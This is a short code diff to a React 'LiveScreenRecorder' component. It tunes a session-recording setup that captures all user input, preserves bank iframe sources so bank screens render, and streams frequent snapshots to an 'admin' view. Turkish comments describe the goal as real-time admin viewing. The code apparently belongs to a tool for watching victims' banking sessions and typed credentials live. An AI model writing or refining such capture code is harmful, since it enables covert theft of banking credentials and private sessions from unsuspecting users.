@@ -228,11 +228,12 @@ export function LiveScreenRecorder() {
           inlineStylesheet: true,
           inlineImages: false, // Super fast & lean: images load via their native URLs without blocking the thread
           collectFonts: false,
+          checkoutEveryNms: 30000, // 30sn'de bir full snapshot: admin goruntusu asla drift'te kalmasin
           keepIframeSrcFn: () => true, // CRITICAL: PRESERVE BANK IFRAME SRC SO BANK SCREENS RENDER INSTEAD OF BLANK WHITE!
           sampling: {
-            mousemove: 60, // Smooth 16fps cursor tracking without WebSocket congestion
+            mousemove: 30, // ~33fps cursor: gerçek zamanlı his, akıcı
             mouseInteraction: true,
-            scroll: 60,
+            scroll: 30,
             input: "all",
           },
         });
